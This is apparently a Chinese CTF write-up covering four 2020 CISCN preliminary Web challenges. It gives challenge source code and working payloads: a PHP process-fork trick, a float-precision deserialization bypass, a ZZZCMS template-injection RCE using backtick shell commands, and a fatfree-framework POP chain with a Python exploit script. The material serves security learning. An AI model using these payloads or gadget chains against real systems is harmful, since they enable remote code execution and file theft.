---
title: 2020CISCN-初赛Web
author: 简文涛
categories:
  - CTF
tags:
  - Write-up
  - CISCN
comments: true
top: false
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825100731.png'
abbrlink: 17919
date: 2020-08-21 10:07:18
updated:
summary:
permalink:
---

不出意外，这应该是最后一次打国赛了，总共22道题，解出15道题，Web一共5道题，最后做出4道题，实验室的两支队伍，最终西南赛区第6和第10，全国第35和53，成功晋级分区赛。

## easyphp

**考点：PHP多线程**

**题目源码：**

```php
<?php
    //题目环境：php:7.4.8-apache
    $pid = pcntl_fork();
    if ($pid == -1) {
        die('could not fork');//创建失败就退出
    }else if ($pid){ //从这里开始写的代码是父进程的
        $r=pcntl_wait($status);//等待或返回fork的子进程状态
        if(!pcntl_wifexited($status)){//检查子进程状态代码是否代表正常退出。
            phpinfo();
        }
    }else{//子进程
        highlight_file(__FILE__);
        if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match("/[:\\\\]|exec|pcntl/i",$_GET['a'])){
            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);//调用回调函数，并把一个数组参数作为回调函数的参数
        }
        posix_kill(posix_getpid(), SIGUSR1);
    }
```

让子进程异常退出，进入到phpinfo中

**Payload:**

```php
?a=call_user_func&b=pcntl_waitpid 
```

执行后 call_user_func_array() 就变成 pcntl_waitpid(false,true)，子进程变为僵尸进程，然后符合else if 执行phpinfo，从而得到flag

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825112819.png)

## easytrick

**考点:PHP弱类型、反序列化、PHP精度问题**

**题目源码：**

```php
<?php 
class trick{ 
    public $trick1; 
    public $trick2; 
    public function __destruct(){ 
        $this->trick1 = (string)$this->trick1; 
        if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){ 
            die("你太长了"); 
        } 
        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){ 
            echo file_get_contents("/flag"); 
        } 
    } 
} 
highlight_file(__FILE__); 
unserialize($_GET['trick']); 
```

题目要求 trick1 和 trick2 的值和类型都不能相等，trick1 和 trick2 长度小于5，并且要让 trick1 和 trick2 的 md5 值相等

**EXP：**

```php
<?php 
class trick{
    public $trick1 = 0.01;
	public $trick2 = 0.1*0.1;
}
$exp = new trick();
echo serialize($exp); 
?>
```

**Payload:**

```php
O:5:"trick":2:{s:6:"trick1";d:0.01;s:6:"trick2";d:0.010000000000000002;} 
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825110028.png)

满足所有条件，成功 bypass ,获得 flag

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825104524.png)

## rceme

**考点：模板注入、RCE**

**题目源码：**

```php
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
parserIfLabel($_GET['a']); 
function danger_key($s) { 
    $s=htmlspecialchars($s); 
    $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');
    $s = str_ireplace($key,"*",$s); 
    $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');
    foreach ($danger as $val){ 
        if(strpos($s,$val) !==false){ 
            die('很抱歉，执行出错，发现危险字符【'.$val.'】'); 
        } 
    } 
    if(preg_match("/^[a-z]$/i")){ 
        die('很抱歉，执行出错，发现危险字符'); 
    } 
    return $s; 
} 
function parserIfLabel( $content ) { 
    $pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/'; 
    if ( preg_match_all( $pattern, $content, $matches ) ) { 
        $count = count( $matches[ 0 ] ); 
        for ( $i = 0; $i < $count; $i++ ) { 
            $flag = ''; 
            $out_html = ''; 
            $ifstr = $matches[ 1 ][ $i ]; 
            $ifstr=danger_key($ifstr,1); 
            if(strpos($ifstr,'=') !== false){ 
                $arr= splits($ifstr,'='); 
                if($arr[0]=='' || $arr[1]==''){ 
                    die('很抱歉，模板中有错误的判断,请修正【'.$ifstr.'】'); 
                } 
                $ifstr = str_replace( '=', '==', $ifstr ); 
            } 
            $ifstr = str_replace( '<>', '!=', $ifstr ); 
            $ifstr = str_replace( 'or', '||', $ifstr ); 
            $ifstr = str_replace( 'and', '&&', $ifstr ); 
            $ifstr = str_replace( 'mod', '%', $ifstr ); 
            $ifstr = str_replace( 'not', '!', $ifstr ); 
            if ( preg_match( '/\{|}/', $ifstr)) { 
                die('很抱歉，模板中有错误的判断,请修正'.$ifstr); 
            }else{ 
                @eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' ); 
            } 
 
            if ( preg_match( '/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { 
                switch ( $flag ) { 
                    case 'if': 
                        if ( isset( $matches2[ 1 ] ) ) { 
                            $out_html .= $matches2[ 1 ]; 
                        } 
                        break; 
                    case 'else': 
                        if ( isset( $matches2[ 2 ] ) ) { 
                            $out_html .= $matches2[ 2 ]; 
                        } 
                        break; 
                } 
            } elseif ( $flag == 'if' ) { 
                $out_html .= $matches[ 2 ][ $i ]; 
            } 
            $pattern2 = '/\{if([0-9]):/'; 
            if ( preg_match( $pattern2, $out_html, $matches3 ) ) { 
                $out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html ); 
                $out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html ); 
                $out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html ); 
                $out_html = $this->parserIfLabel( $out_html ); 
            } 
            $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); 
        } 
    } 
    return $content; 
} 
function splits( $s, $str=',' ) { 
    if ( empty( $s ) ) return array( '' ); 
    if ( strpos( $s, $str ) !== false ) { 
        return explode( $str, $s ); 
    } else { 
        return array( $s ); 
    } 
}
```

搜索发现是ZZZCMS源码的一部分

参考：[[zzzcms(php) v1.7.5 前台RCE-复现](https://forum.90sec.com/t/topic/1239)](https://cloud.tencent.com/developer/article/1576196)

**Payload:**

```php
?a={if:print_r(`ls /`)}{end if}
?a={if:print_r(`cat /flag`)}{end if}
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825110523.png)

## babyunserialize

**考点：pop chain构造、反序列化gadget串联**

使用御剑进行目录扫描发现`www.zip`，存在源码泄露,打开后发现是fatfree框架，进行代码审计

PHP路由：

```php
$f3->route('GET /',
    function($f3) {
        echo "may be you need /?flag=";
    }
);
unserialize($_GET['flag']);
```

发现题目给了一个反序列化位置，且参数可控。

做了很久都没思路，搜到[2020WMCTF-webweb](https://www.4hou.com/posts/vD7X)类似的题,但是还是没做出来，队友最后给的构造方法。

```php
<?php
namespace DB\SQL {
    class Mapper {
        protected $props;
        function __construct($props)
        {
            $this->props = $props;
        }
    }
}

namespace CLI {
    class Agent{
        protected $server;
        protected $socket;
        function __construct($server,$socket)
        {
            $this->server = $server;
            $this->socket= $socket;
        }

    }

    class WS{
        protected $events = [];
        function __construct($events)
        {
            $this->events = $events;
        }
    }
}

namespace {
    class Image{
        public $events = [];
        function __construct($events)
        {
            $this->events = $events;
        }
    }

    $a = new DB\SQL\Mapper(array("write"=>"create_function"));
    $b= new CLI\Agent($a,'){}readfile("/tmp/ffff1l1l1a449g");//');
    $c = new Image(array("disconnect"=>array($b,'send')));
    $d = new CLI\Agent($c,'');
    $e = new CLI\WS($d);
    echo urlencode(serialize($e))."\n";
}
?>
```

**EXP：**

```python
import requests

url = 'http://eci-2ze4mvter6u3r6rigbk1.cloudeci1.ichunqiu.com/?flag='
payload = 'O%3A6%3A%22CLI%5CWS%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A5%3A%22Image%22%3A1%3A%7Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A5%3A%22write%22%3Bs%3A15%3A%22create_function%22%3B%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A37%3A%22%29%7B%7Dreadfile%28%22%2Ftmp%2Fffff1l1l1a449g%22%29%3B%2F%2F%22%3B%7Di%3A1%3Bs%3A4%3A%22send%22%3B%7D%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A0%3A%22%22%3B%7D%7D'
url_all = url+payload
r = requests.get(url_all)
print (r.content)
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200825115752.png)

## littlegame

这道题没有做出来。。。

## 赞助💰

如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>